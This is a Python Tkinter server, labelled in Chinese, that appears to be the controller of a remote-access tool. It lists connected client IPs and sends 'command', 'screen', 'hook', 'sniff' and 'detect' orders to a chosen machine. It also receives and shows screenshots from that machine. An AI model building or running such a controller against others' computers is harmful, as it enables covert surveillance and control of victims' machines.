from tkinter import *
from socket import *
import threading
import time
from pyscreenshot import *
from PIL import Image
import matplotlib.pyplot as plt
import sys

if(len(sys.argv)>1):
    port = int(sys.argv[1])
else:
    port = 10005
address='0.0.0.0'
buffsize=1024
s = socket(AF_INET, SOCK_STREAM)
s.bind((address,port))
s.listen(5)     #最大连接数
conn_list = []
conn_dt = {}

def getfile(sock):
    f = open('screen.jpg','wb')
    flush = sock.recv(buffsize)
    time.sleep(0.5)
    while True:
        filedata = sock.recv(buffsize)
        print (filedata)
        if (filedata == b'get over'):
            print("get file over")
            f.close()
            break
        f.write(filedata)
    img = Image.open('screen.jpg')
    plt.figure('screen')
    plt.imshow(img)
    plt.show()

def tcplink(sock,addr):
    while True:
        if True:
            try:
                recvdata=sock.recv(buffsize).decode('utf-8')
            except:
                print ('Wrong at :'),
                recvdata=sock.recv(buffsize)
                print (recvdata)

            if str(recvdata)[0] == '&':
                for add in conn_list:
                    if conn_dt[add] != sock:
                        recv = str(addr)[1:-1]+'：'+str(recvdata)[1:]
                        conn_dt[add].sendall(recv.encode('utf-8'))
            
            #print ("66666666666666666666666666666666666666!!!!!!!!!!!!!!!!")
            print (recvdata)
            if(recvdata == 'screen shot now'):
                print('filemode!')
                getfile(sock)
            print(recvdata, addr)
            gui.infoList.config(state=NORMAL)
            gui.infoList.insert(END, addr, 'name')
            gui.infoList.insert(END, '：')
            gui.infoList.insert(END, recvdata, 'conment')
            gui.infoList.insert(END, '\n\n')
            gui.infoList.config(state=DISABLED)
            if not recvdata:
                break
        else:
            sock.close()
            print(addr,'offline')
            _index = conn_list.index(addr)
            gui.listBox.delete(_index)
            conn_dt.pop(addr)
            conn_list.pop(_index)
            break
        
def recs():
    while True:
        clientsock,clientaddress=s.accept()
        if clientaddress not in conn_list:
            conn_list.append(clientaddress)
            conn_dt[clientaddress] = clientsock
            gui.listBox.insert(END, clientaddress)
        print('connect from:',clientaddress)
        #在这里创建线程，就可以每次都将socket进行保持
        t=threading.Thread(target=tcplink,args=(clientsock,clientaddress))
        t.start()


class GUI:
    def __init__(self, root):
        self.root = root
        self.leftFrame = Frame(self.root, width=20, height=50)
        self.leftFrame.grid(row=0, column=0)
        self.rightFrame = Frame(self.root, width=20, height=50)
        self.rightFrame.grid(row=0, column=1)
        self.right1 = Frame(self.root, width=20, height=380)
        self.right1.grid(row=0, column=2)
        self.chatTextScrollBar = Scrollbar(self.right1)  
        self.chatTextScrollBar.place(width=20, height=380)
        self.right = Frame(self.root, width=20, height=50)
        self.right.grid(row=0, column=3)
        
        Label(self.leftFrame, text='在线IP地址列表',fg = 'blue').grid(row=0, column=0)
        self.listBox = Listbox(self.leftFrame, width=15, height=25,fg = 'orangered')
        self.listBox.grid(row=1, column=0)
        self.entry = Entry(self.rightFrame, font=('Serief', 18), width=50,highlightcolor='red', highlightthickness=1)
        self.entry.grid(row=0, column=0)
        Label(self.right, text='功能键').grid(row=0, column=0)
        self.sendBtn = Button(self.right, text='单发', command=self.send, width=10,bg = 'dodgerblue')
        self.sendBtn.grid(row=1, column=0)

        self.sendBtn = Button(self.right, text='群发', command=self.sendAll, width=10,bg = 'springgreen')
        self.sendBtn.grid(row=2, column=0)

        self.btn0 = Button(self.right, text='COMMAND', command=self.com, width=10,bg = 'gold')
        self.btn0.grid(row=3, column=0)
        
        self.btn1 = Button(self.right, text='SCREEN', command=self.screen, width=10,bg = 'red')
        self.btn1.grid(row=4, column=0)

        self.btn2 = Button(self.right, text='HOOK', command=self.hook, width=10,bg = 'lightgrey')
        self.btn2.grid(row=5, column=0)

        self.btn3 = Button(self.right, text='SNIFF', command=self.sniff, width=10,bg = 'tan')
        self.btn3.grid(row=6, column=0)

        self.btn4 = Button(self.right, text='DETECT', command=self.detect, width=10,bg = 'greenyellow')
        self.btn4.grid(row=7, column=0)

        self.btn6 = Button(self.right, text='EXIT', command=self.EX, width=10,bg = 'deeppink')
        self.btn6.grid(row=8, column=0)

        self.btn5 = Button(self.right, text='关闭', command=self.close, width=10,bg = 'plum')
        self.btn5.grid(row=9, column=0)
        
        Label(self.rightFrame, text='聊天信息').grid(row=1, columnspan=2)
        self.infoList = Text(self.rightFrame, width=85, height=32)
        self.infoList.grid(row=3, columnspan=2)
        self.infoList.tag_config('name', background='yellow', foreground='red')
        self.infoList.tag_config('conment', background='white', foreground='black')

        self.infoList.config(yscrollcommand=self.chatTextScrollBar.set)
        self.chatTextScrollBar.config(command=self.infoList.yview)

        self.root.bind('<KeyPress-Up>',self.Send)
        self.root.bind('<KeyPress-Down>',self.SendAll)

    def send(self):
        _index = self.listBox.curselection()
        Get = self.entry.get()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, Get, 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall(Get.encode('utf-8'))
        self.entry.delete(0, END)

    def sendAll(self):
        Get = self.entry.get()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, ' '+Get, 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        for add in conn_list:
            conn_dt[add].sendall((' '+Get).encode('utf-8'))
        self.entry.delete(0, END)

    def Send(self,root):
        _index = self.listBox.curselection()
        Get = self.entry.get()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, Get, 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall(Get.encode('utf-8'))
        self.entry.delete(0, END)

    def SendAll(self,root):
        Get = self.entry.get()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, ' '+Get, 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        for add in conn_list:
            conn_dt[add].sendall((' '+Get).encode('utf-8'))
        self.entry.delete(0, END)

    def com(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'command', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('command'.encode('utf-8'))
        self.entry.delete(0, END)
        

    def screen(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'screen', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('screen'.encode('utf-8'))
        self.entry.delete(0, END)

    def hook(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'hook', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('hook'.encode('utf-8'))
        self.entry.delete(0, END)

    def sniff(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'sniff', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('sniff'.encode('utf-8'))
        self.entry.delete(0, END)

    def detect(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'detect', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('detect'.encode('utf-8'))
        self.entry.delete(0, END)

    def EX(self):
        _index = self.listBox.curselection()
        gui.infoList.config(state=NORMAL)
        gui.infoList.insert(END, '服务端', 'name')
        gui.infoList.insert(END, '：')
        gui.infoList.insert(END, 'exit', 'conment')
        gui.infoList.insert(END, '\n\n')
        gui.infoList.config(state=DISABLED)
        conn_dt[self.listBox.get(_index)].sendall('exit'.encode('utf-8'))
        self.entry.delete(0, END)

    def close(self):  
        sys.exit()

def createGUI():
    global gui
    root = Tk()
    root.resizable(0, 0)
    gui = GUI(root)
    root.title('服务器')
    root.mainloop()

if __name__ == '__main__':
    t1 = threading.Thread(target=recs, args=(), name='rec')
    t2 = threading.Thread(target=createGUI, args=(), name='GUI')

    t1.start()
    t2.start()
